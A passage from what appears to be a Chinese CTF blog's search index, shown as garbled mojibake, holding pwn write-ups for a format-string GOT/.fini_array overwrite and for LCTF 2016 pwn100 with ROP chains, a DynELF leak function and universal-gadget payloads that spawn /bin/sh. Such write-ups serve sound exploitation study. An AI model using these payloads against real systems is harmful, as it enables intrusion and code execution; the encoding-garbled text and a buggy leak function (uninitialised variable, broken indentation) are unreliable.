¼å¼åŒ–strlen_got+2) + str(æ ¼å¼åŒ–strlen_got)\n\n9.ä¹‹åè¿˜å¾—ç¡®å®šè¾“å‡ºçš„å€¼ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nfini_array = 0x08049934\nstart_addr = 0x080484f0\nstrlen_got = 0x08049a54\nsystem_plt = 0x08048490\n```\n\næŸ¥çœ‹ä»£ç ï¼Œç”±äºsprintfçš„ä½œç”¨ï¼Œprintfçš„å‚æ•°sä¿å­˜çš„ä¸æ­¢æœ‰æˆ‘ä»¬è¾“å…¥çš„ï¼Œè¿˜æœ‰Nice to meet you,è®¡ç®—åŠ ä¸Šaaå¯å¾—æ€»å…±æœ‰8f-7c+1=0x14ä¸ªï¼Œå†åŠ ä¸Šä¸‰ä¸ª32ä½çš„åœ°å€12å­—èŠ‚ï¼Œæ€»å…±32å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯0x20ã€‚(è®¡ç®—æˆªè‡³ä¸º str(æ ¼å¼åŒ–fini+2)å¤„)\n\n10.å¦å¤–ç”±äº.fini_arrayçš„å†…å®¹ä¸º0x080485a0(æŒ‰då¯æŸ¥çœ‹æ•°æ®)ï¼Œè€Œæˆ‘ä»¬éœ€è¦æ›´æ”¹çš„startåœ°å€ä¸º0x080484f0ï¼Œæ‰€ä»¥åªéœ€è¦æ”¹åŠ¨å¤§ç«¯åºåˆ—ä¸­çš„85a0å˜æˆ84f0å³å¯ã€‚æ‰€ä»¥æ ¼å¼åŒ–.finiä¸­éœ€è¦å†è¾“å‡ºçš„å­—èŠ‚æ•°åº”è¯¥æ˜¯0x84f0-0x20=0x84D0=34000ã€‚è€Œ0x08049934+2å¤„çš„å†…å®¹æœ¬èº«å°±æ˜¯0804ï¼Œä¸éœ€è¦ä¿®æ”¹ã€‚æ‰€ä»¥åªéœ€è¦ä¿®æ”¹.fini_array_addrå¯¹åº”çš„å†…å®¹å³å¯ï¼Œ(.fini_array+2å¯¹åº”çš„å†…å®¹æœ¬èº«å°±æ˜¯0804ï¼Œä¸ç”¨ä¿®æ”¹)ã€‚æ‰€ä»¥payloadå¯ä»¥åˆ å»p32(fini_array_addr+2)å’Œstr(æ ¼å¼åŒ–fini+2)ã€‚\n\n11.æ¥ç€è®¡ç®—ï¼Œéœ€è¦å°†strlen_got+2å¤„çš„å€¼æ”¹æˆ0804ï¼Œç”±äºä¹‹å‰å·²ç»è¾“å‡ºäº†0x84f0æ‰€ä»¥éœ€è¦ç”¨åˆ°æ•°æ®æˆªæ–­ã€‚ä¹Ÿå°±æ˜¯æ ¼å¼åŒ–å†…å®¹ä¸­éœ€è¦å†è¾“å‡ºçš„å­—èŠ‚æ•°ä¸º0x10804-0x84f0=0x8314=33556ã€‚\n\nç„¶åå†è®¡ç®—strlen_gotçš„å€¼ï¼Œéœ€è¦å†è¾“å‡º0x18490-0x10804=0x7c8c=31884ã€‚\n\næ•…éƒ½è®¡ç®—å®Œæ¯•ï¼Œæœ€åpayloadä¸ºï¼š\n\npayload = â€˜aaâ€™ + p32(fini_array_addr) + p32(strlen_got+2) + p32(strlen_got) + â€™%34000c%12$hnâ€™ + â€˜%33556c%13$hnâ€™ + â€˜%31884c%14$hnâ€™\n\n12.payloadä¹‹åï¼Œè¿è¡Œå®Œç¬¬ä¸€æ¬¡çš„printfä¹‹åï¼Œç¨‹åºä¼šå›åˆ°startï¼Œä¹‹åéœ€è¦å†è¾“å…¥å­—ç¬¦ä¸²io.sendline('/bin/sh\\x00')æ¥å®Œæ•´è¿è¡Œsystemï¼Œä»è€Œgetshellã€‚\n","tags":["Fmstr"],"categories":["PWN","Fmstr0x6"]},{"title":"LCTF 2016-pwn100_without_libc","url":"/2021/08/14/LCTF 2016-pwn100_without_libc/","content":"\n1.ä¸ä¹‹å‰åšçš„pwn100ä¸€æ¨¡ä¸€æ ·ï¼Œåªæ˜¯ä¹‹å‰æœ‰ç»™Libcï¼Œè¿™æ¬¡æ²¡ç»™Libcã€‚æ ˆæº¢å‡ºï¼Œé€‰æ‹©ç”¨Putså‡½æ•°æ¥æ³„éœ²åœ°å€ä»è€Œå†æ‰§è¡Œæ ˆæº¢å‡ºæ¥é‡å¤ä½¿ç”¨ã€‚\n\n2.ç¼–å†™leakå‡½æ•°ï¼Œç”±äºç”¨Putså‡½æ•°æ‰“å°ï¼Œæ‰€ä»¥éœ€è¦æœ‰ä¸ªå¾ªç¯æ¡ä»¶ï¼Œå…·ä½“åŸå› å¯ä»¥æŸ¥çœ‹ä¹‹å‰å†™çš„ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\ndef leak(addr):\n    count = 0\n    up = ''\n    content = ''\n    payload = 'A'*72 #padding\n    payload += p64(pop_rdi) #ç»™puts()èµ‹å€¼\n    payload += p64(addr) #leakå‡½æ•°çš„å‚æ•°addr\n    payload += p64(puts_addr) #è°ƒç”¨puts()å‡½æ•°\n    payload += p64(start_addr) #è·³è½¬åˆ°startï¼Œæ¢å¤æ ˆ\n    payload = payload.ljust(200, 'B') #padding\n    io.send(payload)\n    io.recvuntil(\"bye~\\n\")\n    while True: #æ— é™å¾ªç¯è¯»å–ï¼Œé˜²æ­¢recv()è¯»å–è¾“å‡ºä¸å…¨\n        c = io.recv(numb=1, timeout=0.1) #æ¯æ¬¡è¯»å–ä¸€ä¸ªå­—èŠ‚ï¼Œè®¾ç½®è¶…æ—¶æ—¶é—´ç¡®ä¿æ²¡æœ‰é—æ¼\n        count += 1\n        if up == '\\n' and c == \"\": #ä¸Šä¸€ä¸ªå­—ç¬¦æ˜¯å›è½¦ä¸”è¯»ä¸åˆ°å…¶ä»–å­—ç¬¦ï¼Œè¯´æ˜è¯»å®Œäº†\n            data = data[:-1]+'\\x00' #æœ€åä¸€ä¸ªå­—ç¬¦ç½®ä¸º\\x00\n            break\n        else:\n            data += c #æ‹¼æ¥è¾“å‡º\n            up = c #ä¿å­˜æœ€åä¸€ä¸ªå­—ç¬¦\n    data = data[:4] #æˆªå–è¾“å‡ºçš„ä¸€æ®µä½œä¸ºè¿”å›å€¼ï¼Œæä¾›ç»™DynELFå¤„ç†\nlog.info(\"%#x => %s\" % (addr, (data or '').encode('hex')))\nreturn data\n```\n\n3.å¾—åˆ°system_addrçš„åœ°å€åï¼Œåç»­çš„æ“ä½œç”¨ä¸‡èƒ½gadgetå’Œreadå‡½æ•°å³å¯å®ç°ã€‚å¦‚æœè¿˜éœ€è¦å…¶å®ƒåœ°å€ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æ­¤æ–¹æ³•æ¥æ‰“å°ï¼Œä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚\n\n(å‚ç…§ä¹‹å‰ä¸ç»™Libcçš„pwn100)\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["Fmstr"],"categories":["PWN","Fmstr0x6"]},{"title":"LCTF 2016-pwn100","url":"/2021/08/14/LCTF 2016-pwn100/","content":"\n \n\n1.å¸¸è§„checksecï¼Œå¼€äº†NXä¿æŠ¤ã€‚æ‰“å¼€IDAï¼Œæ‰¾æ¼æ´ï¼Œé€æ¬¡è¿›å…¥åï¼Œsub_40068E()å‡½æ•°ä¸­çš„sub_40063Då‡½æ•°ä¸­å­˜åœ¨æ ˆæº¢å‡ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n\nchar v1; // [rsp+0h] [rbp-40h]\n---------------------------------------------\nsub_40063D((__int64)&v1, 200);\n--------------------------------------------------------------------\nfor ( i = 0; ; ++i )\n{\n    result = i;\n    if ( (signed int)i >= a2 )\n      break;\n    read(0, (void *)((signed int)i + a1), 1uLL);\n}\n```\n\nè¿™é‡Œä¼ çš„æ˜¯å±€éƒ¨å˜é‡v1çš„åœ°å€ï¼Œæ‰€ä»¥è¿›å…¥sub_40063Dåï¼Œä¿®æ”¹a1æŒ‡é’ˆå¯¹åº”çš„å†…å­˜çš„å€¼å…¶å®å°±æ˜¯ä¿®æ”¹ä¹‹å‰å±€éƒ¨å˜é‡v1çš„å€¼ï¼Œå°±æ˜¯ä¼ æŒ‡é’ˆã€‚è¿™ä¸ªå‡½æ•°æ¯æ¬¡è¯»å–ä¸€ä¸ªå­—èŠ‚ï¼Œç›´åˆ°è¯»å–æ»¡200å­—èŠ‚ï¼Œå…¶å®å°±å¯ä»¥ç›´æ¥æŠŠå®ƒå½“æˆread(v1,200)å®Œäº‹ã€‚\n\n(é¢˜å¤–è¯ï¼šæ±‡ç¼–ä»£ç ä¸­å½“å±€éƒ¨å˜é‡ä¼ å‚æ—¶ï¼Œéœ€è¦ç”¨åˆ°leaï¼Œå³ï¼šlea   rax, [rbp+var_40]ï¼Œå°±æ˜¯å°†æ ˆä¸Šçš„å˜é‡var_40çš„åœ°å€ç»™raxï¼Œç„¶åä¼ å‚mov   rdi, raxï¼›åˆ©ç”¨rdiæ¥ä¼ å‡½æ•°å‚æ•°ã€‚è¿›å…¥åˆ°å‡½æ•°å†…éƒ¨åå°±ä¼šæœ‰ï¼šmov   [rbp+var_18], rdiï¼Œä¹Ÿå°±æ˜¯åœ¨è¯¥å‡½æ•°æ ˆä¸Šåˆ›å»ºä¸€ä¸ªå±€éƒ¨å˜é‡æ¥ä¿å­˜ä¼ å…¥å˜é‡çš„æ ˆä¸Šçš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯ä¹‹å‰var_40çš„æ ˆä¸Šåœ°å€ï¼Œä¿å­˜åœ¨[rbp+var_18]è¿™ä¸ªå±€éƒ¨å˜é‡ä¸­ã€‚è¿™æ˜¯è¿™ä¸ªç¨‹åºä¸­ï¼Œä¸åŒç¨‹åºå¯èƒ½ä¸å¤ªä¸€æ ·ã€‚)\n\n2.æ‰€ä»¥è¿™ä¸ªæ ˆæº¢å‡ºçš„è¦†ç›–è¿”å›åœ°å€åº”è¯¥æ˜¯sub_40068Eå‡½æ•°çš„è¿”å›åœ°å€ï¼Œç®€å•è¿œç¨‹è°ƒè¯•ä¸€ä¸‹ï¼Œçœ‹çœ‹v1æ‰€åœ¨æ ˆåœ°å€å’Œrbpä¸‹ä¸€åœ°å€çš„è·ç¦»å°±æ˜¯åç§»é‡ï¼Œä¸º0x48ï¼Œçœ‹æ±‡ç¼–è®¡ç®—å°±å¯ä»¥å¾—åˆ°0x40+0x8ã€‚\n\n3.ç°åœ¨éœ€è¦systemå’Œbinshï¼Œè¿™ä¸ªç¨‹åºä¸­è¿™ä¸¤ä¸ªéƒ½æ²¡æœ‰å¸¦ï¼Œè€Œåªæœ‰Libcä¸­æ‰æœ‰ï¼Œä½†æ˜¯è¿™ä¸ªç¨‹åºå¹¶æ²¡æœ‰æ³„éœ²Libcçš„åœ°å€ã€‚åˆ†æç¨‹åºå‘ç°ï¼Œç¨‹åºä¸­.pltæ®µä¸­å¯¼å…¥äº†putså‡½æ•°ï¼ŒIDAä¸­å‡½æ•°åé‚£ä¸€å—å¯ä»¥çœ‹åˆ°ï¼šæ‰€ä»¥å¯ä»¥ç”¨pwntoolsä¸­çš„DynELFï¼Œè°ƒç”¨è¯¥putså‡½æ•°ï¼Œä»è€Œæ³„éœ²å‡ºlibcä¸­putsæˆ–è€…readçš„åœ°å€ã€‚ç”±äºå¤§å¤šæ•™ç¨‹é€‰æ‹©æ³„éœ²readï¼Œæ‰€ä»¥è¿™é‡Œé€‰æ‹©æ³„éœ²putså‡½æ•°åœ¨Libcä¸­çš„è¢«åŠ è½½çš„åœ°å€ã€‚è¿™é‡Œç”¨read,setbuf,ç”šè‡³__libc_start_mainå‡½æ•°ä¹Ÿéƒ½å¯ä»¥ï¼Œå› ä¸ºéƒ½å¯¼å…¥äº†pltè¡¨å’Œå¤–éƒ¨å¼•ç”¨äº†ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552597.png)\n\n4.å¼€å§‹æ„é€ æ³„éœ²åœ°å€çš„ç¬¬ä¸€æ®µpayload:\n\n```\n#æ³¨é‡Šå¤´\n\npayload = \"A\"*72            #padding\npayload += p64(pop_rdi)      \n#ç”±äºéœ€è¦å‘putsä¼ å‚ï¼Œæ‰€ä»¥ç”¨åˆ°è¯¥åœ°å€ï¼Œå¯ä»¥ä½¿ç”¨ropgadget\n#æŸ¥è¯¢ROPgadget --binary pwn100 | grep \"pop rdi ; ret\"\n#æˆ–è€…åœ¨ä¸‡èƒ½gadgetä¸­çš„pop r15ï¼Œç”¨Då‘½ä»¤è½¬æ¢æˆæ•°æ®åå†Cå‘½ä»¤è½¬æ¢å›ä»£ç å¯ä»¥çœ‹åˆ°\npayload += p64(puts_got)\n#è¿™æ˜¯putsåœ¨.gotè¡¨(.got.pltæ®µ)ä¸­çš„åœ°å€ï¼Œæ˜¯ä¼ é€’ç»™Putså‡½æ•°çš„å‚æ•°ï¼Œå½“è¯¥åº“å‡½æ•°è¢«åŠ è½½è¿›å…¥libcä¸­\n#æ—¶ï¼Œè¿™æ ·ä¼ å‚è¿›å»å†æ‰“å°å°±å¯ä»¥æ‰“å°å‡ºputså‡½æ•°åœ¨libcä¸­çš„åœ°å€ï¼Œä¹Ÿå°±æ³„éœ²å‡ºæ¥äº†ã€‚\npayload += p64(puts_addr)\n#è¿™æ˜¯è°ƒç”¨putså‡½æ•°ï¼Œelf.plt['puts']ï¼ˆ.pltæ®µï¼‰\npayload += p64(start_addr)\n#æ•´ä¸ªç¨‹åºçš„èµ·å§‹ä»£ç æ®µï¼Œç”¨ä»¥æ¢å¤æ ˆã€‚è¿™ä¸ªå‡½æ•°ä¸­ä¼šè°ƒç”¨mainå‡½æ•°ã€‚è¿™é‡Œç”¨Mianå‡½æ•°åœ°#å€ä¹Ÿå¯ä»¥\npayload = payload.ljust(200, b\"B\")\n#ä½¿ç”¨Bå¡«å……200å­—èŠ‚ä¸­é™¤å»å…ˆå‰payloadå‰©ä½™çš„ç©ºé—´ï¼Œå¡«å……çš„åŸå› æ˜¯å› ä¸ºè¿™ä¸ªç¨‹åºéœ€è¦æˆ‘ä»¬è¾“å…¥æ»¡200å­—èŠ‚\n#æ‰ä¼šè·³å‡ºå¾ªç¯ï¼Œè¿›è€Œæ‰æœ‰è¦†ç›–è¿”å›åœ°å€çš„å¯èƒ½ã€‚æˆ–è€…å¯ä»¥å†™æˆï¼š\n#(payload += 'a'*(200-0x48-32))\n```\n\n5.ä¹‹åå¼€å§‹è¿è¡Œpayloadæ¥å®é™…å¾—åˆ°Putså‡½æ•°è¢«libcåŠ è½½çš„å®é™…å†…å­˜åœ°å€ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nio.send(payload)\nio.recvuntil('bye~\\n')#è·³å‡ºå¾ªç¯åæ‰ä¼šæ‰§è¡Œåˆ°æ‰“å°byeçš„åœ°æ–¹\nputs_addr = u64(io.recv()[:-1].ljust(8, b'\\x00'))\n#è¿™é‡Œå°±æ˜¯æ¥æ”¶æ³„éœ²åœ°å€çš„åœ°æ–¹ï¼Œæœ«å°¾éœ€è¦å¡«å……ä¸Š\\x00\nlog.info(\"puts_addr = %#x\", puts_addr)\nsystem_addr = puts_addr - 0xb31e0\nlog.info(\"system_addr = %#x\", system_addr)\n```\n\n6.ç°åœ¨å¾—åˆ°äº†putså‡½æ•°è¢«libcåŠ è½½çš„å®é™…å†…å­˜åœ°å€ï¼Œé‚£ä¹ˆputså‡½æ•°ä¸å…¶å®ƒå‡½æ•°çš„åç§»é‡ä¹Ÿå°±å¯ä»¥é€šè¿‡ç”¨IDAæ‰“å¼€é¢˜ç›®ç»™çš„libcæŸ¥å‡ºæ¥ï¼Œä»è€Œå¾—åˆ°å…¶å®ƒæˆ‘ä»¬éœ€è¦çš„å‡½æ•°è¢«libcåŠ è½½çš„å®é™…å†…å­˜åœ°å€ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\n00000000000456A0  ---system_in_libc\n00000000000F8880 ---read_in_libc\n0000000000070920  ---puts_in_libc\n000000000018AC40 ---binsh_in_libc\n```\n\nå¾—åˆ°libcè¢«åŠ è½½çš„é¦–åœ°å€ï¼šputs_addr å‡å» puts_in_libc ç­‰äºlibc_startã€‚äºæ˜¯libc_startåŠ ä¸Šå„è‡ªå‡½æ•°å¯¹åº”çš„in_libcä¹Ÿå°±å¯ä»¥å¾—åˆ°è¢«libcåŠ è½½çš„å®é™…å†…å­˜åœ°å€ã€‚\n\n7.ç°åœ¨éƒ½æœ‰äº†å°±å¯ä»¥å°è¯•åœ¨æ‰§è¡Œä¸€æ¬¡æ ˆæº¢å‡ºæ¥å¼€shellï¼Œ64ä½ç¨‹åºï¼Œæœ‰äº†systemå‡½æ•°å’Œbinshåœ°å€ï¼Œé‚£ä¹ˆæ ˆæº¢å‡ºè¦†ç›–ç”¨pop rdi;retçš„æ–¹æ³•å¯ä»¥ç›´æ¥getshellã€‚\n\n8.è¿™é‡Œå‡è®¾æ²¡æœ‰binshï¼Œæ¥ä½¿ç”¨ä¸€ä¸‹ä¸‡èƒ½gadgetï¼šé€šè¿‡æˆ‘ä»¬çš„è¾“å…¥è¯»åˆ°å†…å­˜ä¸­ã€‚åŒæ ·è¿™å¼ å›¾ï¼Œä¸‡èƒ½Gadget1ä¸ºloc_400616ï¼Œä¸‡èƒ½Gadget2ä¸ºloc_400600\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552166.png)\n\nä»¥ä¸‹ä¸ºç”¨æ¥è¯»å–binshå­—ç¬¦ä¸²çš„ä»£ç ï¼Œè¿™é‡Œéœ€è¦åœ¨ç¨‹åºä¸­æ‰¾åˆ°ä¸€æ®µå¯ä»¥å†™å…¥ä¹‹åä¸ä¼šè¢«ç¨‹åºè‡ªåŠ¨ä¿®æ”¹çš„å†…å­˜ï¼Œä¹Ÿå°±æ˜¯binsh_addr=0x60107cï¼Œè¿™ä¸ªåœ°å€å…¶å®æ˜¯externçš„åœ°å€ï¼Œé‡Œé¢åŸæ¥ä¿å­˜çš„å†…å®¹æ˜¯readå‡½æ•°å‘ç”Ÿå»¶è¿Ÿç»‘å®šä¹‹å‰çš„åœ°å€ã€‚è€Œå»¶è¿Ÿç»‘å®šå‘ç”Ÿä¹‹åï¼Œgotè¡¨ä¸­ä¿å­˜çš„å†…å®¹å·²ç»è¢«æ”¹æˆäº†è¢«LibcåŠ è½½çš„çœŸå®åœ°å€ï¼Œè¿™ä¸ªexternä¹Ÿå°±æ²¡ç”¨äº†ï¼Œå¯ä»¥éšæ„ç”¨ã€‚ä½†å¦‚æœæŸä¸ªå‡½æ•°æ²¡æœ‰è¢«é¦–æ¬¡è°ƒç”¨ï¼Œå³è¿˜æ²¡å‘ç”Ÿå»¶è¿Ÿç»‘å®šï¼Œè€Œæˆ‘ä»¬å´å…ˆä¸€æ­¥æ”¹æ‰äº†externçš„å†…å®¹ï¼Œé‚£ä¹ˆå®ƒå°±å†ä¹Ÿæ²¡åŠæ³•è¢«è°ƒç”¨äº†ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\n\nbinsh_addr = 0x60107c\t\t\t\n#bssæ”¾äº†STDINå’ŒSTDOUTçš„FILEç»“æ„ä½“ï¼Œä¿®æ”¹ä¼šå¯¼è‡´ç¨‹åºå´©æºƒ\n\npayload = b\"A\"*72\npayload += p64(universal_gadget1) #ä¸‡èƒ½gadget1\npayload += p64(0) #rbx = 0\npayload += p64(1)\n#rbp = 1ï¼Œè¿‡æ‰åé¢ä¸‡èƒ½gadget2çš„callè¿”å›åçš„åˆ¤æ–­,ä½¿å®ƒæ­¥è¿›è¡Œè·³è½¬ï¼Œè€Œæ˜¯é¡ºåºæ‰§è¡Œåˆ°ä¸‡\n#èƒ½gadget1ï¼Œä»è€Œreturnåˆ°æœ€å¼€å§‹æ¥å†æ‰§è¡Œæ ˆæº¢å‡ºä»è€ŒGetshellã€‚\n#cmp ç®—æœ¯å‡æ³•è¿ç®—ç»“æœä¸ºé›¶,å°±æŠŠZF(é›¶æ ‡å¿—)ç½®1,cmp a bå³è¿›è¡Œè¿ç®—a-b\npayload += p64(read_got)\n#r12 = gotè¡¨ä¸­readå‡½æ•°é¡¹ï¼Œé‡Œé¢æ˜¯readå‡½æ•°çš„çœŸæ­£åœ°å€ï¼Œç›´æ¥é€šè¿‡callè°ƒç”¨\npayload += p64(8) #r13 = 8ï¼Œreadå‡½æ•°è¯»å–çš„å­—èŠ‚æ•°ï¼Œä¸‡èƒ½gadget2èµ‹å€¼ç»™rdx\npayload += p64(binsh_addr) #r14 = readå‡½æ•°è¯»å–/bin/shä¿å­˜çš„åœ°å€ï¼Œä¸‡èƒ½gadget2èµ‹å€¼ç»™rsi\npayload += p64(0)\n#r15 = 0ï¼Œreadå‡½æ•°çš„å‚æ•°fdï¼Œå³STDINï¼Œä¸‡èƒ½gadget2èµ‹å€¼ç»™edi\npayload += p64(universal_gadget2) #ä¸‡èƒ½gadget2\npayload += b'\\x00'*56\n#ä¸‡èƒ½gadget2åæ¥åˆ¤æ–­è¯­å¥ï¼Œè¿‡æ‰ä¹‹åæ˜¯ä¸‡èƒ½gadget1ï¼Œè€ŒLoc_400616ä¸‡èƒ½gadget1æ‰§è¡Œä¹‹\n#åä¼šä½¿å¾—æ ˆç©ºé—´å‡å°‘7*8ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æå‰è¾“å…¥7*8æ¥ä½¿å¾—ä¸‡èƒ½gadget1æ‰§è¡Œä¹‹\n#åæ ˆçš„ä½ç½®ä¸å‘ç”Ÿå˜åŒ–ï¼Œä»è€Œèƒ½æ­£å¸¸retä¹‹åæ¥ä¸Šçš„start_addr\n#ç”¨äºå¡«å……æ ˆï¼Œè¿™é‡Œç”¨Aä¹Ÿæ˜¯ä¸€æ ·\npayload += p64(start_addr) #è·³è½¬åˆ°startï¼Œæ¢å¤æ ˆ\npayload = payload.ljust(200, b\"B\") #padding\n#ä¸çŸ¥é“è¿™æœ‰ä»€ä¹ˆç”¨ï¼Œå»æ‰ä¸€æ ·å¯ä»¥getshellï¼Œå› ä¸ºè¿™è¾¹æ˜¯ç›´æ¥è°ƒç”¨readå‡½æ•°ï¼Œè€Œä¸æ˜¯ç»è¿‡\n#sub_40068E()éå¾—æ³¨æ»¡200å­—èŠ‚æ‰èƒ½è·³å‡ºå¾ªç¯ã€‚\n\nio.send(payload)\nio.send(b\"/bin/sh\\x00\")\n#ä¸Šé¢çš„ä¸€æ®µpayloadè°ƒç”¨äº†readå‡½æ•°è¯»å–\"/bin/sh\\x00\"ï¼Œè¿™é‡Œå‘é€å­—ç¬¦ä¸²\n#ä¹‹åå›åˆ°ç¨‹åºèµ·å§‹ä½ç½®start\n```\n\nè¿™é‡Œä¸‡èƒ½Gadgetä¸­ç»™r12èµ‹å€¼ï¼Œä¼ å…¥çš„ä¸€å®šæ˜¯è¯¥å‡½æ•°çš„gotè¡¨ï¼Œå› ä¸ºè¿™é‡Œçš„callå’Œå¸¸è§„çš„callæœ‰ç‚¹ä¸å¤ªä¸€æ ·ã€‚æˆ‘ä»¬åœ¨IDAè°ƒè¯•æ—¶æŒ‰ä¸‹Dè½¬æ¢æˆç¡¬ç¼–ç å½¢å¼ï¼Œ(è¿™é‡Œå¯ä»¥åœ¨IDAä¸­é€‰é¡¹-å¸¸è§„-åæ±‡ç¼–-æ“ä½œç å­—èŠ‚æ•°è®¾ç½®ä¸º8)å¯ä»¥çœ‹åˆ°è¿™ä¸ªcallçš„ç¡¬ç¼–ç æ˜¯FFï¼Œè€Œå¸¸è§„çš„callç¡¬ç¼–ç æ˜¯E8ã€‚(è¿™é‡Œcallç¡¬ç¼–ç ä¹‹åçš„å­—èŠ‚ä»£è¡¨çš„æ˜¯åˆå¹¶ç¨‹åºæ®µä¹‹å‰çš„åç§»é‡ï¼Œå…·ä½“å¯ä»¥å‚è€ƒé™æ€ç¼–è¯‘ã€åŠ¨æ€ç¼–è¯‘ã€é“¾æ¥æ–¹é¢çš„çŸ¥è¯†)åœ¨è¿™ä¸ªæŒ‡ä»¤é›†ä¸‹é¢ï¼š\n\nFFçš„callåé¢è·Ÿçš„æ˜¯åœ°å€çš„åœ°å€ã€‚ä¾‹å¦‚call [func], è·³è½¬çš„åœ°æ–¹å°±åº”è¯¥æ˜¯funcè¿™ä¸ªåœ°å€é‡Œä¿å­˜çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯*funcã€‚\n\nE8çš„callåé¢è·Ÿçš„æ˜¯åœ°å€ã€‚ä¾‹å¦‚call funcï¼Œè·³è½¬çš„åœ°æ–¹å°±æ˜¯funcçš„å¼€å¤´ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552928.jpeg)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552607.jpeg)\n\nè¿™é‡Œå¯ä»¥ä¸ç”¨éå¾—çœ‹ç¡¬ç¼–ç ï¼Œå¯ä»¥ç›´æ¥çœ‹æ±‡ç¼–ä¹Ÿå¯ä»¥æ˜¾ç¤ºå‡ºæ¥ï¼šä¸€ä¸ªæœ‰[],ä¸€ä¸ªæ²¡æœ‰[]ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552863.jpeg)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552842.jpeg)\n\n9.æ‰€ä»¥ä¸‡èƒ½gadgetä¸­é€šè¿‡r12ï¼Œä¼ å…¥è·³è½¬å‡½æ•°çš„åœ°å€åªèƒ½æ˜¯å‘ç”Ÿå»¶è¿Ÿç»‘å®šä¹‹åçš„gotè¡¨åœ°å€ï¼Œè€Œä¸èƒ½æ˜¯pltè¡¨åœ°å€æˆ–è€…æ˜¯æ²¡æœ‰å‘ç”Ÿå»¶è¿Ÿç»‘å®šçš„gotè¡¨åœ°å€ï¼Œ(å»¶è¿Ÿç»‘å®šåªèƒ½é€šè¿‡pltè¡¨æ¥æ“ä½œï¼Œæ²¡æœ‰å‘ç”Ÿå»¶è¿Ÿç»‘å®šä¹‹å‰ï¼Œè¯¥gotè¡¨ä¸­çš„å†…å®¹æ˜¯ç­‰åŒäºæ— æ•ˆçš„ï¼Œåªæ˜¯ä¸€ä¸ªexternæ®µçš„åç§»åœ°å€ï¼Œé™¤éè¯¥å‡½æ•°funcæ˜¯é™æ€ç¼–è¯‘è¿›ç¨‹åºé‡Œé¢çš„ï¼Œé‚£ä¹ˆgotè¡¨ä¸­çš„å†…å®¹å°±æ˜¯è¯¥å‡½æ•°çš„çœŸå®æœ‰æ•ˆåœ°å€ï¼Œä¸ä¼šå‘ç”Ÿå»¶è¿Ÿç»‘å®šã€‚)å› ä¸ºpltè¡¨ä¸­çš„å†…å®¹è½¬æ¢æˆç¡¬ç¼–ç å‹æ ¹å°±ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆåœ°å€ï¼Œæ›´åˆ«è¯´è·³è½¬åˆ°è¯¥åœ°å€ä¿å­˜çš„å†…å®¹çš„åœ°æ–¹äº†ã€‚æœ‰äººè¯´è·³è½¬åˆ°pltè¡¨æ‰§è¡Œçš„å°±æ˜¯è·³è½¬gotè¡¨ï¼Œé‚£åº”è¯¥æ˜¯ä¸€æ ·çš„å•Šï¼Œä½†FFçš„callå¹¶ä¸æ˜¯è·³è½¬åˆ°pltæ¥æ‰§è¡Œé‡Œé¢çš„ä»£ç ï¼Œè€Œæ˜¯å–pltè¡¨ä¸­å†…å®¹å½“ä½œä¸€ä¸ªåœ°å€å†è·³è½¬åˆ°è¯¥åœ°å€æ¥æ‰§è¡Œä»£ç ï¼Œæ‰€ä»¥æœ‰æ—¶å€™éœ€è¦çœ‹æ±‡ç¼–ä»£ç æ¥å†³å®šç©¶ç«Ÿæ˜¯ä¼ å…¥gotè¡¨è¿˜æ˜¯ä¼ å…¥pltè¡¨ã€‚åŒæ ·ä¹Ÿå¯ä»¥çœ‹åˆ°pltè¡¨ä¸­çš„ç¡¬ç¼–ç æ˜¯FFï¼Œä¹Ÿå°±æ˜¯å¹¶ä¸æ˜¯è·³è½¬gotè¡¨ï¼Œè€Œæ˜¯å–gotè¡¨ä¸­ä¿å­˜çš„å†…å®¹å½“ä½œä¸€ä¸ªåœ°å€å†æ¥è·³è½¬ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552806.jpeg)\n\nâ–²è¯´äº†è¿™ä¹ˆå¤šï¼Œè®°ä½ä¸€ä¸ªå°±è¡Œäº†ï¼Œ\n\néœ€è¦è·³è½¬å‡½æ•°æ—¶ï¼Œæœ‰[]çš„-åªèƒ½ä¼ gotè¡¨ï¼Œæ²¡[]çš„-ä¼ pltè¡¨(pltè¡¨æ›´å®‰å…¨å¥½ä½¿ï¼Œä½†åé¢æ ¼å¼åŒ–å­—ç¬¦ä¸²åŠ«æŒgotè¡¨åˆæœ‰ç‚¹ä¸å¤ªä¸€æ ·ï¼Œæƒ…å†µæ¯”è¾ƒå¤æ‚)ã€‚\n\néœ€è¦æ‰“å°çœŸå®å‡½æ•°åœ°å€æ—¶ï¼Œä¼ çš„ä¸€å®šæ˜¯gotè¡¨ï¼Œè¿™æ ·å°±ä¸€å®šæ²¡é”™ã€‚\n\nå½“æœ‰call eax;è¿™ç±»è¯­å¥æ—¶ï¼Œeaxä¸­ä¿å­˜çš„ä¸€å®šå¾—æ˜¯ä¸€ä¸ªæœ‰æ•ˆåœ°å€ï¼Œå› ä¸ºè¿™é‡Œçš„callç¡¬ç¼–ç 